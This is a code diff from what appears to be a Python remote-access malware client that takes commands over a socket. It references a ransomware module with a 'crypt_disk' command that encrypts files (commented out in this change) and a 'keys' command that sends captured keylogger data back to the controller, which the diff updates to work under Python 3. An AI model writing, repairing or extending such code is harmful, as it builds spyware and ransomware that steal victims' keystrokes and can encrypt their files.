@@ -3,7 +3,7 @@ from __future__ import absolute_import
 import threading
 import socket
 import json
-from ransom.crypt import crypt
+#from ransom.crypt import crypt
 from sysinfo.info import get_sys_info
 import base64
 import os
@@ -27,7 +27,7 @@ while True:
     # crypt_disk [<path>]
     if command[0] == 'crypt_disk':
         try:
-            crypt(command[1] if len(command) > 1 else os.path.dirname(os.path.realpath(__file__)))
+            #crypt(command[1] if len(command) > 1 else os.path.dirname(os.path.realpath(__file__)))
             connection.send(json.dumps({'status': 'OK'}))
         except:
             connection.send(json.dumps({'status': 'ERROR'}))
@@ -58,7 +58,7 @@ while True:
         except:
             connection.send((json.dumps({'status': 'ERROR'})))
     elif command[0] == 'keys':
-        connection.send(json.dumps({'status': 'OK', 'data': keylogger.log}))
+        connection.send(bytes(json.dumps({'status': 'OK', 'data': keylogger.log}), encoding='utf-8'))
         keylogger.log = ''
     else:
         connection.send(json.dumps({'status': 'ERROR', 'data': 'unrecognized command'}))
